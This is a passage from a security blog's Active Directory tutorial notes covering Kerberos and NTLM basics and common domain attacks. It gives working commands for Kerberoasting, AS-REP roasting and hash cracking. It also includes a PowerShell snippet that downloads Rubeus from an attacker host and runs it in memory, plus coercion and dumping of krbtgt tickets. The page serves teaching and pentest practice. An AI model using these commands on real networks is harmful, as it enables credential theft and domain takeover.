<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Notes AD AD Basics" /><meta name="author" content="BatBato" /><meta property="og:locale" content="en" /><meta name="description" content="Active Directory" /><meta property="og:description" content="Active Directory" /><link rel="canonical" href="nouman404.github.io/Notes/AD/AD_Basics" /><meta property="og:url" content="nouman404.github.io/Notes/AD/AD_Basics" /><meta property="og:site_name" content="BatBato’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-04-08T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes AD AD Basics" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BatBato" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BatBato"},"dateModified":"2025-08-28T11:10:51+02:00","datePublished":"2024-04-08T00:00:00+02:00","description":"Active Directory","headline":"Notes AD AD Basics","mainEntityOfPage":{"@type":"WebPage","@id":"nouman404.github.io/Notes/AD/AD_Basics"},"url":"nouman404.github.io/Notes/AD/AD_Basics"}</script><title>Notes | AD | AD Basics | BatBato's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BatBato's Blog"><meta name="application-name" content="BatBato's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BatBato's Blog</a></div><div class="site-subtitle font-italic">BatBato was here :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Nouman404" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/235762" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Batbato" aria-label="tryhackme" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://www.root-me.org/BatBato" aria-label="rootme" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | AD | AD Basics</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | AD | AD Basics</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1712527200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 8, 2024 </em> </span> <span> Updated <em class="" data-ts="1756372251" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 28, 2025 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Bat </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4690 words"> <em>26 min</em> read</span></div></div></div><div class="post-content"><h1 id="active-directory">Active Directory</h1><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Well, well well… Here we are. Doing an Active Directory introduction note. Lets start by defining what is <code class="language-plaintext highlighter-rouge">Active directory</code>. Active Directory (AD), is the windows directory. It allows interconnection between computers and/or servers. The computers and servers in a domain (computer cluster) can have any distribution in it (Unix-like or windows).</p><p>I will not get into too much detail on how active directory works, what is a domain, forest… I will focus only on the different protocols and attacks on it. If you want to get more information about how an AD works, and want basic or advanced knowledge on it, I advise you the great post <a href="https://zer1t0.gitlab.io/posts/attacking_ad/">Attacking Active Directory: 0 to 0.9</a>.</p><h2 id="protocols"><span class="mr-2">Protocols</span><a href="#protocols" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Before talking about the attacks on AD, I will just talk about the basic protocols that we have on windows AD. First we will talk about the famous three headed dog… I mean <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol.</p><h3 id="kerberos"><span class="mr-2">Kerberos</span><a href="#kerberos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol uses tickets. You ask tickets, you get tickets and you give tickets. But why do we need tickets ? Because you would, for example, access a service on the domain. For example, let’s say you would like to access a web server or a server that share files… You will have to authenticate to this service. In an AD environment, you will, most of the time, use the <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol for the authentication process (or NetNTLM but we will talk about it later).</p><p>Because an image is worth a big speech:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center"><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/kerb_auth.png" alt="[kerb_auth.png]" data-proofer-ignore><tbody><tr><td style="text-align: center"><em>paloaltonetworks image</em></table></div><p>Lets break this down. Lets say you want to access a server.</p><ul><li><p>First, you have to connect to your workstation. When you enter your credentials, you request a <code class="language-plaintext highlighter-rouge">TGT</code> (Ticket Granting Ticket) to the <code class="language-plaintext highlighter-rouge">AS</code> (Authentication Service). Then, the <code class="language-plaintext highlighter-rouge">AS</code> checks if you are who you pretend to be (username and key derived from your password). If your credentials are valid, the <code class="language-plaintext highlighter-rouge">AS</code> will provide you with the requested <code class="language-plaintext highlighter-rouge">TGT</code>.</p><li><p>Now, when you try to connect to a server, it will check if the <code class="language-plaintext highlighter-rouge">Kerberos</code> protocol is available for this server. If so, you will request a <code class="language-plaintext highlighter-rouge">ST</code> (Service Ticket) to the <code class="language-plaintext highlighter-rouge">TGS</code> (Ticket Granting Service). To be able to do that, the <code class="language-plaintext highlighter-rouge">TGT</code> is sent to the <code class="language-plaintext highlighter-rouge">TGS</code> so it can authenticate the client.</p><li><p>With the <code class="language-plaintext highlighter-rouge">ST</code>, you just have to give it to the server that will check the validity of the ticket and authenticate you.</p></ul><blockquote class="prompt-danger"><div><p>Be aware of the difference between <code class="language-plaintext highlighter-rouge">ST</code> and <code class="language-plaintext highlighter-rouge">TGS</code>. The <code class="language-plaintext highlighter-rouge">TGS</code> is the SERVICE providing the TICKET, where <code class="language-plaintext highlighter-rouge">ST</code> is the TICKET.</p></div></blockquote><p>The <code class="language-plaintext highlighter-rouge">KDC</code> (Key Distribution Center) is the fusion of an <code class="language-plaintext highlighter-rouge">AS</code> and a <code class="language-plaintext highlighter-rouge">TGS</code>. It is often the <code class="language-plaintext highlighter-rouge">DC</code> (Domain Controller) that has the role of <code class="language-plaintext highlighter-rouge">KDC</code>.</p><h3 id="ntlm"><span class="mr-2">NTLM</span><a href="#ntlm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>There is often a bit of confusion when we talk about <code class="language-plaintext highlighter-rouge">NTLM</code>. Do we speak about an authentication protocol or about a hash algorithm ? Well the authentication protocol is often called <code class="language-plaintext highlighter-rouge">NTLM</code> but the full name is <code class="language-plaintext highlighter-rouge">Net-NTLM</code>. There are different versions of this protocol like <code class="language-plaintext highlighter-rouge">Net-NTLMv1</code> or <code class="language-plaintext highlighter-rouge">Net-NTLMv2</code>. For now, only these 2 versions exist. And when we speak about a hash we just say <code class="language-plaintext highlighter-rouge">NTLM hash</code>. The <code class="language-plaintext highlighter-rouge">Net-NTLM hash</code> is the challenge + the response. But what people think of when we speak about <code class="language-plaintext highlighter-rouge">NTLM hash</code> is the <code class="language-plaintext highlighter-rouge">NT hash</code> concatenated to <code class="language-plaintext highlighter-rouge">LM hash</code>. This hash (<code class="language-plaintext highlighter-rouge">NT</code> + <code class="language-plaintext highlighter-rouge">LM hash</code>) can be used for authentication, relayed or cracked offline, where the <code class="language-plaintext highlighter-rouge">Net-NTLM hash</code> can only be cracked offline.</p><p><strong>Pass The Hash</strong> leverages a feature of Windows’ <code class="language-plaintext highlighter-rouge">NTLM</code> authentication, where a user’s hashed password (rather than the plaintext password) can be used for authentication across networked services, essentially allowing the hash to serve as an equivalent credential within Windows environments.</p><blockquote class="prompt-danger"><div><p>The <code class="language-plaintext highlighter-rouge">Net-NTLM hash</code> can’t be passed. You can’t do a PtH (Pass the Hash) attack.</p></div></blockquote><p>The client uses its <code class="language-plaintext highlighter-rouge">NT</code> hash during the <code class="language-plaintext highlighter-rouge">NTLM</code> authentication mechanism in order to calculate a response for the server.</p><p><code class="language-plaintext highlighter-rouge">NT</code> hash can be used to authenticate to several services (ex: SMB, LDAP, RDP…).</p><p>The following scheme shows how the NTLM authentication mechanism works:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_NTLM_Prot.png" alt="[AD_NTLM_Prot.png]" data-proofer-ignore></p><ol><li>First the client sends a <code class="language-plaintext highlighter-rouge">NEGOCIATE</code> message to the server. This message allows to share security information between the client and the server (ex: NTLM version to use)<li>Then the server generates a <code class="language-plaintext highlighter-rouge">CHALLENGE</code> and sends it into a <code class="language-plaintext highlighter-rouge">CHALLENGE</code> message. (It also confirms the negotiated options and sends information about the server like computer name, version, domain name…)<li>Now that the client has the challenge, it calculates the response using the client key (NT hash). Now, the client sends the response to the challenge to the server.<li>Finally, the server will verify that the challenge response is correct. If so, the communication is now possible between the two and the following messages may be signed with the session key.</ol><blockquote class="prompt-info"><div><p>Note that on the step “3.” the client may also create, if required, a session key and encrypts it using a key derived from the <code class="language-plaintext highlighter-rouge">NT Hash</code>. The session key is then sent to the server with the response of the challenge.</p></div></blockquote><h3 id="ldap"><span class="mr-2">LDAP</span><a href="#ldap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><code class="language-plaintext highlighter-rouge">LDAP</code> provides a standardized way to access and manage directory services, making it a fundamental component of many network infrastructure setups. For example, you can use <code class="language-plaintext highlighter-rouge">LDAP</code> to list all the users of a domain.</p><h2 id="attacks"><span class="mr-2">Attacks</span><a href="#attacks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now that we know more about how an AD is working, we are going to talk about the most basic attacks on it.</p><h3 id="kerberoasting"><span class="mr-2">Kerberoasting</span><a href="#kerberoasting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In Active Directory, a <code class="language-plaintext highlighter-rouge">ST</code> can be requested by any user for any service that is registered in the domain database through an <code class="language-plaintext highlighter-rouge">SPN</code> (Service Principal Names), regardless of whether the service is running or not. Only service accounts should have an <code class="language-plaintext highlighter-rouge">SPN</code> but sometimes a regular user has an <code class="language-plaintext highlighter-rouge">SPN</code>.</p><blockquote class="prompt-info"><div><p>An <code class="language-plaintext highlighter-rouge">SPN</code> looks like <code class="language-plaintext highlighter-rouge">service_class/machine_name[:port][/path]</code></p></div></blockquote><p>The <code class="language-plaintext highlighter-rouge">Kerberoast</code> attack consists of requesting <code class="language-plaintext highlighter-rouge">STs</code> for those services of regular user accounts and try to crack them to get the user passwords. Usually, the users that have services also have privileges, so these are juicy accounts.</p><h4 id="enumeration--exploitation"><span class="mr-2">Enumeration / Exploitation</span><a href="#enumeration--exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>First of all, we need a user of the domain to be able to launch this attack. Once you have that, you can use LDAP queries, Bloodhound or GetUsersSPN (from impacket) to find the potential vulnerable users. The basic command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetUserSPNs.py <span class="nt">-request</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASSWORD</span> <span class="nt">-outputfile</span> kerberoasting.hashes
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_kerb_getspn.png" alt="[AD_kerb_getspn.png]" data-proofer-ignore></p><blockquote class="prompt-tip"><div><p>You can use <code class="language-plaintext highlighter-rouge">hashes</code> instead of the user password that you own by specifying the <code class="language-plaintext highlighter-rouge">-hashes LM_HASH:NT_HASH</code>. This is called <code class="language-plaintext highlighter-rouge">PtH</code> (Pass the Hash)</p></div></blockquote><p>For better visualization, you can use <a href="https://www.kali.org/tools/bloodhound.py/">bloodhound-python</a> to export all the necessary information from the domain using commands like:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bloodhound-python <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-p</span> <span class="nv">$PASSWORD</span> <span class="nt">-ns</span> <span class="nv">$DC_IP</span> <span class="nt">-d</span> <span class="nv">$DOMAIN</span>.local <span class="nt">-c</span> all <span class="nt">--zip</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_kerb_blood_py.png" alt="[AD_kerb_blood_py.png]" data-proofer-ignore></p><p>Now that you exported the data with <code class="language-plaintext highlighter-rouge">bloodhound-python</code>, you can use the default <code class="language-plaintext highlighter-rouge">bloodhound</code> GUI program to see any information about the domain you are trying to exploit. There is an option to see all <code class="language-plaintext highlighter-rouge">Kerberoastable</code> account in a graph format.</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_kerb_blood.png" alt="[AD_kerb_blood.png]" data-proofer-ignore></p><p>The same thing can be done using <code class="language-plaintext highlighter-rouge">NetExec</code> :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nxc ldap <span class="nv">$DC_IP</span> <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$PASSWORD</span><span class="s2">"</span> <span class="nt">-d</span> <span class="nv">$DOMAIN</span>.local <span class="nt">--kerberoasting</span> KERBEROASTING
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_kerb_cme.png" alt="[AD_kerb_cme.png]" data-proofer-ignore></p><p>You can now use tools like <code class="language-plaintext highlighter-rouge">hashcat</code> to try cracking the recovered hash:</p><p><code class="language-plaintext highlighter-rouge">hashcat -m 13100 Kerberoastables.txt /usr/share/wordlists/rockyou.txt</code></p><blockquote class="prompt-warning"><div><p>Note that you can get a <code class="language-plaintext highlighter-rouge">ST</code> for a service account. You won’t be able to crack it because it is generated automatically by the DC. It is a 120 random characters long passwords. Good luck cracking this XD.</p></div></blockquote><h3 id="as-reproasting"><span class="mr-2">AS-REPRoasting</span><a href="#as-reproasting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Because some applications don’t support Kerberos <code class="language-plaintext highlighter-rouge">preauthentication</code>, it is common to find users with <strong>Kerberos preauthentication disabled</strong>, hence allowing attackers to request <code class="language-plaintext highlighter-rouge">TGTs</code> for these users and crack the session keys offline.</p><p>As for the <code class="language-plaintext highlighter-rouge">Kerberoast</code> attack, you can also use <code class="language-plaintext highlighter-rouge">Bloodhound GUI</code> to search <code class="language-plaintext highlighter-rouge">AS-REPRoastable</code> users. But here we are going to look only for the command line exploit.</p><h4 id="enumeration--exploitation-1"><span class="mr-2">Enumeration / Exploitation</span><a href="#enumeration--exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GetNPUsers.py <span class="nt">-request</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="s2">"</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASSWORD</span><span class="s2">"</span>
</pre></table></code></div></div><p>Here we just listed the potentially vulnerable users and exported their hash from the <code class="language-plaintext highlighter-rouge">TGT</code> in a file called <code class="language-plaintext highlighter-rouge">ASREProastables.txt</code>.</p><p>If this doesn’t work or if you don’t have a valid pair of credentials you can provide a user list like so:</p><p><img data-src="https://raw.githubusercontent.com/Nouman404/nouman404.github.io/main/_posts/Notes/photos/AD_kerb_getnpuser.png" alt="[AD_kerb_getnpuser.png]" data-proofer-ignore></p><blockquote class="prompt-tip"><div><p>Note that you can use the <code class="language-plaintext highlighter-rouge">-hashes "$LM_HASH:$NT_HASH"</code> to use the hash of the user you own instead of its password.</p></div></blockquote><p>We can now try to crack them all using <code class="language-plaintext highlighter-rouge">hashcat</code>:</p><p><code class="language-plaintext highlighter-rouge">hashcat -m 18200 -a 0 ASREProastables.txt /usr/share/wordlists/rockyou.txt</code></p><p>It may be worth mentioning that we can exploit AS-REProasting as an unauthenticated attacker. We just need to know the domain name (visible in crackmapexec output) and the username (that we can bruteforced with kerbrute or using a user list like we did earlier).</p><h3 id="golden--silver-tickets"><span class="mr-2">Golden / Silver Tickets</span><a href="#golden--silver-tickets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First of all, Golden and Silver tickets are used for persistence. This mean that you won’t use it on CTFs or pentest but it is a well known persistence method so it is good to know it.</p><h4 id="silver-tickets"><span class="mr-2">Silver Tickets</span><a href="#silver-tickets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Lets start with silver tickets. A <code class="language-plaintext highlighter-rouge">Silver Ticket</code> grants us access to a specific service. It allows us to generate a ST (Service Ticket) for this service. To do that, we need to know the kerberos key of this service account. To recover this key you can, for example, dump the <code class="language-plaintext highlighter-rouge">lsass</code> process or use tools like <code class="language-plaintext highlighter-rouge">secretsdump</code> (stealthier). Tools like <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz</a> (<code class="language-plaintext highlighter-rouge">kerberos::golden</code>) or the impacket <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">ticketer.py</a> can be used to do that.</p><h4 id="golden-tickets"><span class="mr-2">Golden Tickets</span><a href="#golden-tickets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">Golden Tikets</code> allows us to have unrestricted access to a whole domain by generating a <code class="language-plaintext highlighter-rouge">TGT</code> for any user. To be able to do that, we need to have access to the <code class="language-plaintext highlighter-rouge">krbtgt</code> key and to get this, we need to be domain admin (DA).</p><h3 id="delegations"><span class="mr-2">Delegations</span><a href="#delegations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Delegation is a mechanism in which a machine (the delegation server) can impersonate a user on a service. This means that the service thinks that the user ask for the resource where in reality it is the delegation server that is asking the resource to the server and then forward it to the user.</p><p>I will not get into too much detail here. you can have more information about the delegation on <a href="https://www.thehacker.recipes/a-d/movement/kerberos/delegations">the hacker recipes</a> or <a href="https://en.hackndo.com/constrained-unconstrained-delegation/">hackndo</a>. They both are inspired by the article of Elad Shamir <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a> and this article is much more detailed than the two previous blogs. <a href="https://youtu.be/byykEId3FUs">Here</a> is also a talk about delegation presented by Shutdown (<a href="https://twitter.com/_nwodtuhs">@nwodtuhs</a>). (The french version <a href="https://www.youtube.com/watch?v=7_iv_eaAFyQ">here</a>).</p><blockquote class="prompt-warning"><div><p>I will use the appellation <code class="language-plaintext highlighter-rouge">delegation server</code>. This can be any kind of server (web, share, database…) that does the mechanism of delegation. Its role isn’t only to delegate.</p></div></blockquote><h4 id="unconstrained-delegation"><span class="mr-2">Unconstrained Delegation</span><a href="#unconstrained-delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This type of delegation was the first one created. It is not recommended to use it anymore. This allows the <code class="language-plaintext highlighter-rouge">Unconstrained Delegation</code> server to impersonate any user for any service. The only users that can’t be impersonated are the one in the group <code class="language-plaintext highlighter-rouge">Protected Users</code> and the one with the flag <code class="language-plaintext highlighter-rouge">NOT_DELEGATED</code> in the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a> attribute of the user account.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: center"><img data-src="https://en.hackndo.com/assets/uploads/2019/02/unconstrained_delegation_schema.png" alt="[unconstrained_delegation_schema]" data-proofer-ignore><tbody><tr><td style="text-align: center"><strong>Source: HacknDo</strong></table></div><p>The client connects to the service by sending its <code class="language-plaintext highlighter-rouge">ST</code>. Inside his <code class="language-plaintext highlighter-rouge">ST</code>, the <code class="language-plaintext highlighter-rouge">DC</code> puts a copy of the user’s <code class="language-plaintext highlighter-rouge">TGT</code>. That service uses this <code class="language-plaintext highlighter-rouge">TGT</code> to impersonate the client to any other service.</p><p>To exploit the delegation mechanism, you’ll need the hash of the service account or being admin of the machine.</p><p>Here we will have as an exemple an unconstrained delegation between <code class="language-plaintext highlighter-rouge">PC</code> and <code class="language-plaintext highlighter-rouge">DC</code>.</p><p>First connect to the machine (<code class="language-plaintext highlighter-rouge">PC</code>) then launch <code class="language-plaintext highlighter-rouge">Rubeus</code> in memory like so:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="s1">'http://$KALI_IP:8080/Rubeus.exe'</span><span class="p">)</span><span class="w">
</span><span class="nv">$assem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span><span class="w">
</span><span class="p">[</span><span class="n">Rubeus.Program</span><span class="p">]::</span><span class="n">MainString</span><span class="p">(</span><span class="s2">"triage"</span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><p>This command allows you to list all available tickets. Now we can use <code class="language-plaintext highlighter-rouge">coercer</code> to force a connection from <code class="language-plaintext highlighter-rouge">PC</code> to <code class="language-plaintext highlighter-rouge">DC</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 coercer.py <span class="nt">-u</span> <span class="nv">$ADMIN_PC</span> <span class="nt">-d</span> <span class="nv">$DOMAIN_PC</span> <span class="nt">-p</span> <span class="nv">$PASS_ADMIN_PC1</span> <span class="nt">-t</span> <span class="nv">$DC</span> <span class="nt">-l</span> <span class="nv">$PC_NAME</span> 
</pre></table></code></div></div><p>Now if you run again the <code class="language-plaintext highlighter-rouge">triage</code> command, you should see the <code class="language-plaintext highlighter-rouge">krbtgt</code> ticket in the list. To recover it, you can use the following command:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Rubeus.Program</span><span class="p">]::</span><span class="n">MainString</span><span class="p">(</span><span class="s2">"dump /user:</span><span class="nv">$MACHINE_NAME_DC</span><span class="s2"> /service:krbtgt /nowrap"</span><span class="p">);</span><span class="w">
</span></pre></table></code></div></div><p>Now, we have a base64 ticket, you can convert it as a <code class="language-plaintext highlighter-rouge">ccache</code> file like so:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">cat </span>tgt.b64|base64 <span class="nt">-d</span> <span class="o">&gt;</span> ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/PATH/TO/ticket.ccache
</pre></table></code></div></div><p>And now we can use it to use command with this ticket like <code class="language-plaintext highlighter-rouge">SecretsDump</code> for exemple using the <code class="language-plaintext highlighter-rouge">-k</code> option.</p><h4 id="s4u2self"><span class="mr-2">S4U2Self</span><a href="#s4u2self" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">S4U2Self</code> is an extension of <code class="language-plaintext highlighter-rouge">Kerberos</code>. It allows a machine that does delegation to impersonate a user on itself. To be more specific, it allows the machine to get a <code class="language-plaintext highlighter-rouge">ST</code> for its service (itself) as any user. This is very convenient when a service does not use <code class="language-plaintext highlighter-rouge">Kerberos</code> as its authentication mechanism.</p><p>Lets say that you try to connect to a service that uses the <code class="language-plaintext highlighter-rouge">Net-NTLM</code> authentication mechanism. <code class="language-plaintext highlighter-rouge">Net-NTLM</code> doesn’t use tickets, it is not related to <code class="language-plaintext highlighter-rouge">Kerberos</code>. This means that the delegation mechanism can’t work because it relies on the use 